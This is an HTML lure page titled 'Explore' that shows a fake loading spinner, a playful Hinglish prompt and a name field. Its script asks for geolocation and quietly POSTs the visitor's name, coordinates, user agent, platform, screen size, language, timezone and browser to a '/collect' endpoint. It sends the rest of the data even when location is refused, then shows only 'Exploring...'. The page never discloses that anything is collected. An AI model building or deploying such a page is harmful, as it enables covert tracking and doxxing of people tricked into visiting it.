
<!DOCTYPE html>
<html>
<head>
    <title>Explore</title>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }

        body {
            height: 100vh;
            background: url("https://wallpapers.com/images/hd/flying-broomstick-shinchan-aesthetic-dxawp880blvyt95g.jpg") no-repeat center center/cover;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        
        .loader-screen {
            position: fixed;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid #444;
            border-top: 5px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            100% { transform: rotate(360deg); }
        }

    
        .card {
            width: 90%;
            max-width: 350px;
            padding: 25px;
            border-radius: 20px;

            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(12px);

            border: 1px solid rgba(255,255,255,0.2);
            box-shadow: 0 8px 30px rgba(0,0,0,0.5);

            text-align: center;
            color: white;

            display: none; 
        }

        h1 {
            font-size: 28px;
        }

        p {
            font-size: 15px;
            color: #ddd;
            margin: 15px 0;
        }

        label {
            font-size: 14px;
            display: block;
            margin-top: 15px;
            margin-bottom: 8px;
            text-align: left;
        }

        input[type="text"] {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid rgba(255, 255, 255, 0.3);
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 14px;
            box-sizing: border-box;
            transition: 0.3s;
            margin-bottom: 15px;
        }

        input[type="text"]::placeholder {
            color: rgba(255, 255, 255, 0.6);
        }

        input[type="text"]:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.15);
            border: 1px solid rgba(99, 102, 241, 0.8);
            box-shadow: 0 0 10px rgba(99, 102, 241, 0.4);
        }

        button {
            margin-top: 20px;
            width: 100%;
            padding: 14px;
            border-radius: 12px;
            border: none;

            background: linear-gradient(135deg, #3b82f6, #6366f1);
            color: white;
            font-size: 16px;

            cursor: pointer;
            transition: 0.3s;
        }

        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 15px rgba(99,102,241,0.8);
        }

        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: scale(1);
        }

        .error-message {
            color: #ff6b6b;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
    </style>
</head>

<body>


<div class="loader-screen" id="loader">
    <div class="spinner"></div>
</div>

<div class="card" id="mainCard">
    <h1>AA GYE AP👀</h1>
    <p>LAADLE KUCH JAADU DEKHNA?</p>

    <label for="nameInput">Enter Your Name:</label>
    <input 
        type="text" 
        id="nameInput" 
        placeholder="Type your name here..." 
        autocomplete="off"
    />
    <div class="error-message" id="errorMessage">Please enter your name to proceed!</div>

    <button onclick="handleProceed()">Let's explore then</button>
</div>

<script>

window.onload = function() {
    setTimeout(() => {
        document.getElementById("loader").style.display = "none";
        document.getElementById("mainCard").style.display = "block";
    }, 2000); 
};

function handleProceed() {
    const nameInput = document.getElementById("nameInput").value.trim();
    const errorMessage = document.getElementById("errorMessage");
    
    if (nameInput === "") {
        errorMessage.style.display = "block";
        return;
    }
    
    errorMessage.style.display = "none";
    sendData(nameInput);
}

// Allow Enter key to submit
document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("nameInput").addEventListener("keypress", function(event) {
        if (event.key === "Enter") {
            handleProceed();
        }
    });
});

function sendData(username) {
    navigator.geolocation.getCurrentPosition(function(pos) {
        const data = {
            username: username,
            device: navigator.userAgent,
            platform: navigator.platform,
            screen: window.screen.width + "x" + window.screen.height,
            location: pos.coords.latitude + ", " + pos.coords.longitude,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            browser_name: getBrowserName()
        };

        fetch('/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        alert("Exploring...");
    },
    function() {
        // If location denied, still send other data
        const data = {
            username: username,
            device: navigator.userAgent,
            platform: navigator.platform,
            screen: window.screen.width + "x" + window.screen.height,
            location: "Location permission denied",
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            browser_name: getBrowserName()
        };

        fetch('/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        alert("Exploring...");
    });
}

function getBrowserName() {
    const ua = navigator.userAgent;
    if (ua.indexOf("Firefox") > -1) return "Firefox";
    if (ua.indexOf("Chrome") > -1) return "Chrome";
    if (ua.indexOf("Safari") > -1) return "Safari";
    if (ua.indexOf("Edge") > -1) return "Edge";
    if (ua.indexOf("Opera") > -1) return "Opera";
    return "Unknown";
}
</script>

</body>
</html>
